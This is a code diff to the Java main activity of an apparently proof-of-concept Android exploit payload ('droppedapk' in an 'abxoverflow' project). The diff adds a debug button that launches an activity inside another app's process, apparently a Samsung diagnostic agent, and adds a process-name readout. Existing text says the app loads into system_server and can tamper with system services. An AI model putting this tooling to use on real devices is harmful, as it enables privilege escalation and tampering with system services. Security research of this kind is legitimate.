@@ -3,6 +3,7 @@ package com.example.abxoverflow.droppedapk;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.os.Process;
@@ -15,6 +16,8 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 import android.os.ServiceManager;
+
+import com.example.abxoverflow.droppedapk.debug.ProcessActivityLauncher;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -37,6 +40,17 @@ public class MainActivity extends Activity {
     }
 
     private static final String TAG = "DroppedAPK";
+
+
+    private void runTest() throws Exception {
+        ProcessActivityLauncher.launch(
+                this,
+                "com.example.abxoverflow.droppedapk.system",
+                "com.example.abxoverflow.droppedapk.DebugActivity",
+                Process.myUid(),
+                "com.sec.android.diagmonagent"
+        );
+    }
 
     @SuppressLint("PrivateApi")
     private static void collectInstances() {
@@ -100,6 +114,7 @@ public class MainActivity extends Activity {
         Button btnShell = this.findViewById(R.id.btn_shell);
         Button btnInspect = this.findViewById(R.id.btn_inspect);
         Button btnInternalDex = this.findViewById(R.id.btn_internal_dex);
+        Button btnTest = this.findViewById(R.id.btn_test);
 
         btnShell.setOnClickListener(v -> {
             final EditText input = new EditText(this);
@@ -161,6 +176,15 @@ public class MainActivity extends Activity {
             }
         });
 
+        btnTest.setOnClickListener(v -> {
+            try {
+                runTest();
+            }
+            catch (Exception e) {
+                Log.e(TAG, "Failed to run test", e);
+                Toast.makeText(MainActivity.this, "Failed to run test: " + e + " (" + e.getMessage() + ")", Toast.LENGTH_SHORT).show();
+            }
+        });
 
         String id = "?";
         try {
@@ -176,6 +200,7 @@ public class MainActivity extends Activity {
                                 " To fully uninstall use \"Uninstall\" button within this app" +
                                 "\n\nuid=").append(Process.myUid())
                 .append("\npid=").append(Process.myPid())
+                .append("\nprocess=").append((Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) ? Process.myProcessName() : "?")
                 .append("\n\n").append(id)
                 .append("\n\nBelow is list of system services, as this app loads into system_server it can directly tamper with local ones (those that are non-null and non-BinderProxy)");
 
